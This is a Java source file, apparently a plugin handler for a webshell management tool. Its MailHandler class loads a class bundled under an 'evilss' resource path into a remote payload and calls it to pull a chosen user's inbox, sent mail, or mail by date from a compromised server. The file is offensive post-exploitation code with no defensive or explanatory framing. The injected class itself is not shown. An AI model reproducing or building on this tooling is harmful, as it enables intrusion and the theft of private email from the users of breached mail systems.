/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import util.functions;
import util.http.ReqParameter;

/**
 *
 * @author Administrator
 */
public class MailHandler extends HandlerBase{

    public String getmailbydate(String date,String username) {
        this.payload.include("GetMailbyDate", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/SearchAPI.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("username", username);
        reqParameter.add("date", date);
        return encoding.Decoding(payload.evalFunc("GetMailbyDate", "getMailbyDate", reqParameter));
    }

    public String getinbox(String username) {
        this.payload.include("Getinbox", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/SearchAPI.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("username", username);
        return encoding.Decoding(payload.evalFunc("Getinbox", "getMailsomebody", reqParameter));
    }

    public String getsend(String username) {
        this.payload.include("GetSendMail", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/SearchAPI.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("username", username);
        return encoding.Decoding(payload.evalFunc("GetSendMail", "getsendMails", reqParameter));
    }

}
